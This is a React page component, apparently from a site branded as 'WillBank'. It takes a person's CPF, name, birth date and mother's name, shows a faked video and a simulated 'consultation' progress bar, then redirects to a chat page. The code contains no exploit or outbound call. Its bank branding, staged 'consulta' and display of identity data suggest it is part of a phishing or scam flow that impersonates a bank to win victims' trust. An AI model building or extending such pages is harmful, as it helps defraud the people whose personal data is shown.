import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CreditCard, User, Calendar, Users, Search, Volume2 } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { Progress } from "@/components/ui/progress";

const Video = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);
  const [showConsulta, setShowConsulta] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Simular progresso de loading
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setShowConsulta(true);
          // Após mostrar consulta, navegar para chat
          setTimeout(() => {
            navigate("/chat", { state: { cpfData } });
          }, 3000);
          return 100;
        }
        return prev + 1;
      });
    }, 50);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  const dataFields = [
    { icon: CreditCard, value: cpfData.cpf },
    { icon: User, value: cpfData.nome },
    { icon: Calendar, value: cpfData.dataNascimento },
    { icon: Users, value: cpfData.nomeMae },
  ];

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-2xl">
          <div className="space-y-4 sm:space-y-6">
            {/* Progress bar at top */}
            <Progress value={progress} className="h-1.5 sm:h-2" />

            {/* Video Placeholder */}
            <div className="relative aspect-video bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-xl sm:rounded-2xl overflow-hidden shadow-xl">
              {/* Fake video content */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="text-center">
                  <div className="w-28 h-28 sm:w-40 sm:h-40 mx-auto bg-gradient-to-br from-primary to-amber-400 rounded-2xl flex items-center justify-center shadow-2xl">
                    <span className="text-4xl sm:text-5xl">👩‍💼</span>
                  </div>
                </div>
              </div>
              
              {/* Audio Button Overlay */}
              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-5 py-3 sm:px-8 sm:py-4 rounded-full flex items-center gap-2 sm:gap-3 font-bold text-sm sm:text-base shadow-2xl hover:bg-primary/90 hover:scale-105 transition-all duration-300">
                <Volume2 className="w-5 h-5 sm:w-6 sm:h-6" />
                Clique para ouvir
              </button>

              {/* Video controls */}
              <div className="absolute top-2 right-2 sm:top-4 sm:right-4 flex gap-1.5 sm:gap-2">
                <button className="bg-black/60 backdrop-blur-sm text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-black/80 transition-colors">
                  📋 Desanexar
                </button>
                <button className="bg-black/60 backdrop-blur-sm text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-black/80 transition-colors">
                  ⏭️ RGX
                </button>
              </div>
            </div>

            {/* User Data Card */}
            <div className="border-2 border-primary/40 rounded-xl sm:rounded-2xl overflow-hidden shadow-sm">
              {/* Yellow top border already from Card */}
              <div className="divide-y divide-border/40">
                {dataFields.map((field, index) => {
                  const Icon = field.icon;
                  return (
                    <div key={index} className="flex items-center gap-3 p-3 sm:p-4 hover:bg-muted/30 transition-colors">
                      <div className="w-9 h-9 sm:w-11 sm:h-11 bg-gradient-to-br from-primary/20 to-primary/10 rounded-lg sm:rounded-xl flex items-center justify-center">
                        <Icon className="w-4 h-4 sm:w-5 sm:h-5 text-primary" />
                      </div>
                      <span className="font-semibold text-foreground text-sm sm:text-base">{field.value}</span>
                    </div>
                  );
                })}
                
                {/* Consulta Status */}
                <div className="flex items-center gap-3 p-3 sm:p-4 bg-primary/5">
                  <div className="w-9 h-9 sm:w-11 sm:h-11 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center">
                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!showConsulta ? 'animate-pulse' : ''}`} />
                  </div>
                  <span className={`font-medium text-sm sm:text-base ${showConsulta ? 'text-success' : 'text-muted-foreground'}`}>
                    {showConsulta ? "✓ Consulta finalizada!" : "Sua consulta está em andamento..."}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Video;
